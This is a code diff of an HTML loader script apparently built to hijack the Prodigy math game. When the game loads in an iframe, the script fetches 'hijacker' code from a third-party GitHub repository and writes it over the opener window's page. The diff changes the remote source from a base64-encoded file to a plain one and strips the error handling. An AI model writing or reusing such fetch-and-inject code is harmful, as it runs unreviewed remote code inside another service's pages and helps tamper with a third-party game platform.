@@ -2,8 +2,10 @@
     Your browser doesn't support iframes
 </iframe>
 
+
+
 <script>
-    try {
+    try{
         fetch("https://sso.prodigygame.com/premises?premises=home", {
             "headers": {
                 "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
@@ -12,34 +14,21 @@
             "method": "POST",
             "mode": "cors"
         });
-    } catch (e) {
-        console.error(e);
     }
-
-    var launcher = document.getElementById("launcher");
-
+    catch(e){
+        console.error(e)
+    }
+    var launcher = document.getElementById("launcher")
     launcher.onload = async function(e) {
         if (launcher.contentWindow.location.host == 'math.prodigygame.com') {
-            try {
-                // Fetch the Base64-encoded hijacker code
-                var hijackercode = await (await fetch("https://raw.githubusercontent.com/DragonProdHax/variable/refs/heads/main/index.html")).text();
-
-                // Decode the Base64 content
-                hijackercode = atob(hijackercode);
-
-                // Extract the game file URL
-                window.opener.gamecodeurl = launcher.contentDocument.querySelector('script#gameFile').src;
-
-                // Inject the decoded code into the opener document
-                if (window.opener.history.pushState) {
-                    window.opener.document.open();
-                    window.opener.document.write(hijackercode);
-                    window.opener.document.close();
-                    window.close();
-                }
-            } catch (e) {
-                console.error(e);
+            var hijackercode = await (await fetch("https://raw.githubusercontent.com/prodsexloader/customloadscreen/main/index.html")).text();
+            window.opener.gamecodeurl = launcher.contentDocument.querySelector('script#gameFile').src;
+            if (window.opener.history.pushState) {
+                window.opener.document.open();
+                window.opener.document.write(hijackercode);
+                window.opener.document.close();
+                window.close();
             }
         }
-    };
+    }
 </script>
